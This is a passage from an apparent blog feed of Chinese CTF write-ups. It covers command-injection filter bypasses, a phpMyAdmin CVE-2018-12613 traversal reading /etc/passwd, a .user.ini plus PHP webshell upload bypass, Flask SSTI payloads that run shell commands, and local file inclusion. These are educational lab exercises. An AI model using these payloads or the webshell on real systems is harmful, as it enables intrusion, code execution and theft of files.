class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test2 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test2[<span class="number">1</span>] == <span class="string">"e"</span> <span class="keyword">and</span> test2[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test2))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a()</span><br><span class="line">    b()</span><br></pre></td></tr></table></figure><p>得到的两个结果：</p><p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p><p>于是构造payload：</p><p><img src="https://i.loli.net/2020/03/26/VeCyFHRv6gtrNMA.png" alt="image-20200227130010106.png"></p><p>发包得到flag</p><h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://i.loli.net/2020/03/26/XuHCYU1QhOmJjKV.png" alt="image-20200206123430992.png"></p><p>查看源代码后发现存在<code>calc.php</code></p><p><img src="https://i.loli.net/2020/03/26/7hItzkUQ2niOAMo.png" alt="image-20200206123607870.png"></p><p>访问得到后台源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p><blockquote><p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p></blockquote><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6654#toc-1" target="_blank" rel="noopener">从一道题到协议层攻击之HTTP请求走私</a></li><li><a href="https://blog.csdn.net/yankai0219/article/details/8269922" target="_blank" rel="noopener">http协议中content-length 以及chunked编码分析</a></li><li><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></li></ul><h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(61693386291,10,36)(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/VKmzCTMPjrql56t.png" alt="image-20200206144030983.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/jTtwYx6EiCNeuBG.png" alt="image-20200206144200310.png"></p><h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p><blockquote><ul><li>删除初始空格</li><li>将某些字符转换为下划线（包括空格）</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/eiZEwfv6rm1MyFp.png" alt="image-20200206144515082.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/fPgRS4jI8pOZdAT.png" alt="image-20200206144617598.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入</title>
      <link href="/2020/03/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GXYCTF—Ping-Ping-Ping"><a href="#2019GXYCTF—Ping-Ping-Ping" class="headerlink" title="2019GXYCTF—Ping Ping Ping"></a>2019GXYCTF—Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p><p>别人学校招新的题目，我还是不会，太菜了</p><p>先来看看题目的界面</p><p><img src="https://i.loli.net/2020/03/26/Bx4MsVNnCIuf31W.png" alt="image-96.png"></p><p>由题意得，传参ip</p><p><img src="https://i.loli.net/2020/03/26/GqdRXFuj8P5Jnfv.png" alt="image-97.png"></p><p>联想命令执行，命令执行的方法大致两种：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;：用于连续指令执行</span><br><span class="line">|：管道符，将左边的输出当做右边的输入，只返回右边的结果</span><br></pre></td></tr></table></figure><p>尝试分号：</p><p><img src="https://i.loli.net/2020/03/26/m6xK58o1wBJC7yQ.png" alt="image-98.png"></p><p>发现目录下包含两个文件：index.php 和 flag.php</p><p>尝试cat查看：</p><p><img src="https://i.loli.net/2020/03/26/aPN1QtpXzl4WZum.png" alt="image-99.png"></p><p><img src="https://i.loli.net/2020/03/26/rlMy17n4ds8mZGN.png" alt="image-100.png"></p><p>emmmmmmmmmmmmm空格被办了。。。</p><p>从大佬那学习绕过空格的方法，大概有以下几种：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span></span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line"><span class="meta">%</span><span class="bash">20 </span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br></pre></td></tr></table></figure><p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p><p><img src="https://i.loli.net/2020/03/26/hfwW3oSuBTdRx4E.png" alt="image-101.png"></p><p><img src="https://i.loli.net/2020/03/26/1zF4SdTx7YGHPr2.png" alt="image-102.png"></p><p>index.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat fl* 利用*匹配任意 不行</span><br><span class="line">echo "Y2F0IGZsYWcucGhw"| base64 -d | bash 也不行</span><br><span class="line">ca\t fl\ag.php 不行</span><br><span class="line">cat fl''ag.php 不行</span><br></pre></td></tr></table></figure><p>最后使用变量拼接：</p><p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p><p>利用到解题中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/sWYwAqFgBS5O2KT.png" alt="image-103.png"></p><p>[・_・?]</p><p>F12即可得出答案：</p><p><img src="https://i.loli.net/2020/03/26/4s7cSPaWQF8Dh9Y.png" alt="image-104.png"></p><p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener">ping</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE</title>
      <link href="/2020/03/22/CVE/"/>
      <url>/2020/03/22/CVE/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GWCTF—我有一个数据库"><a href="#2019GWCTF—我有一个数据库" class="headerlink" title="2019GWCTF—我有一个数据库"></a>2019GWCTF—我有一个数据库</h3><p>核心—————–phpmyadmin[CVE-2018-12613]</p><p>利用dirb扫到phpmyadmin后台</p><p>利用该漏洞可进行任意文件读取</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/U3Wqrb6eI2fVTEo.png" alt=""></p><p>漏洞复现介绍与利用：</p><ul><li>首发：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">ChaMd5安全团队</a></li><li>大专栏：<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li><li>Freebuf：<a href="https://www.freebuf.com/column/207707.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207707.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/03/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/03/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h3><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><p>复现链接：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h4 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h4><p><img src="https://i.loli.net/2020/03/27/lYX3o4uCSLD6KAR.png" alt="image-20200209103925041"></p><p>上传一句话.php文件，结果如下</p><p><img src="https://i.loli.net/2020/03/27/oNOBinePfykYvdc.png" alt="image-20200209104816676"></p><p>更改后缀和文件类型为图片格式，结果如下，过滤了<code>&lt;?</code></p><p><img src="https://i.loli.net/2020/03/27/lBZmiTFqy6J3HXC.png" alt="image-20200209105358989"></p><p>用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马绕过，结果如下</p><p><img src="https://i.loli.net/2020/03/27/v6pstSMJZ2Od9U1.png" alt="image-20200209105253270"></p><p>应该调用了后端的<code>exif_imagetype()</code>函数，于是添加文件头绕过<code>GIF89a</code>，上传成功</p><p><img src="https://i.loli.net/2020/03/27/oSEKOYIgl6chwMk.png" alt="image-20200209110003787"></p><p>到这一步应该想到上传一个<code>.htaccess</code>文件来将图片马解析为php，尝试无果，于是用到了下面的.user.ini文件</p><p>参考</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p><a href="https://xz.aliyun.com/t/6091#toc-1" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p></blockquote><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="上传-uesr-ini文件"><a href="#上传-uesr-ini文件" class="headerlink" title="上传.uesr.ini文件"></a>上传.uesr.ini文件</h5><p>内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/jGWUcINk6BP2Mis.png" alt="image-20200209104439117"></p><blockquote><p>ini文件设置中有两个参数：<code>auto_prepend_file</code>和<code>auto_append_file</code></p><p>表示我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code></p><p>两个设置的区别在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p></blockquote><p>利用前提需要文件目录下有一个可执行的.php文件，而题目刚好有一个</p><h5 id="上传a-jpg图片马"><a href="#上传a-jpg图片马" class="headerlink" title="上传a.jpg图片马"></a>上传a.jpg图片马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/mVLsZNldRE8Wjgq.png" alt="image-20200209113304522"></p><p>访问index.php，用工具连接后台，在网站根目录下得到flag</p><p><img src="https://i.loli.net/2020/03/27/kpYBG1v7eDTntWM.png" alt="image-20200209113410626"></p><p>也可以将图片马代码改成如下方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;system(<span class="string">'cat /flag'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接访问index.php即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2020/03/22/SSTI/"/>
      <url>/2020/03/22/SSTI/</url>
      
        <content type="html"><![CDATA[<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p><p><img src="https://i.loli.net/2020/03/27/ArigdbxJnc9mSlC.png" alt=""></p><p>懵了，于是购买writeup进行学习：</p><p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p><p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p><p>方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>解题步骤：</p><p>1、测试是否存在SSTI：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/A8wToMCOaILsY3j.png" alt=""></p><p>事实证明存在SSTI</p><p>2、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>来查看所有模块</p><p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p><img src="https://i.loli.net/2020/03/27/YD9I1EQGlJe2svU.png" style="zoom:67%;" /><p>4、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-84.png" alt=""></p><p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看flag文件所在</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-85.png" alt=""></p><p>6、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可得到flag，如图所示</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-86.png" alt=""></p><p><strong>writeup里的另外一种姿势：</strong></p><img src="D:\Blog\source\_posts\SSTI.assets\image-87.png" style="zoom:67%;" /><p><strong>另外，里面还有一种更骚的操作：</strong></p><img src="D:\Blog\source\_posts\SSTI.assets\image-88.png" style="zoom:67%;" /><p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a></p><p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p><p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">Python OS 文件/目录方法</a></p><h3 id="BJDCTF-2nd—fake-google"><a href="#BJDCTF-2nd—fake-google" class="headerlink" title="BJDCTF-2nd—fake google"></a>BJDCTF-2nd—fake google</h3><p>界面：</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100426394.png" alt="image-20200324100426394"></p><p>随便输入测试后得到一以下结果，推测是SSTI</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100451322.png" alt="image-20200324100451322"></p><p>F12打开后发现提示果然是SSTI</p><p><img src="D:%5CBlog%5Csource_posts%5CSSTI.assets%5Cimage-20200324100534466.png" alt="image-20200324100534466"></p><p>测试后发现啥都没过滤，于是直接上payload：</p><p>payload1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat /flag | base64'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>命令执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>文件操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞小结</title>
      <link href="/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p><p>文件包含作用函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span><span class="comment">//包含过程中出现错误直接退出程序</span></span><br><span class="line"><span class="keyword">include</span>();<span class="comment">//包含过程出现错误，抛出警告，程序继续运行</span></span><br><span class="line"><span class="keyword">require_once</span>();<span class="comment">//包括require()的功能，但函数只包含一次</span></span><br><span class="line"><span class="keyword">include_once</span>();<span class="comment">//包括include()的功能，但函数只包含一次</span></span><br></pre></td></tr></table></figure><p>该函数用以加载另一个文件中的php代码，并且当php来执行</p><p>而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>无限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/9qOz4VAx3X1wHJi.png" alt="image-20200315203414355"></p><p>可用于读取系统其它文件的内容</p><p>例如<code>2.php?a=../../../../../../../etc/passwd</code></p><p>有限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>];<span class="keyword">include</span>($a.<span class="string">".html"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><p><code>%00</code>截断，条件：<code>magic_quotes_gpc</code> = <code>Off</code>，php版本&lt;<code>5.3.4</code></p><p>路径长度截断，条件：windows OS –&gt; 在文件后加点，点号需要长于256；linux OS –&gt; 用<code>./</code>，需长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><h3 id="远程文件包含"><a href="#远程文件包含" 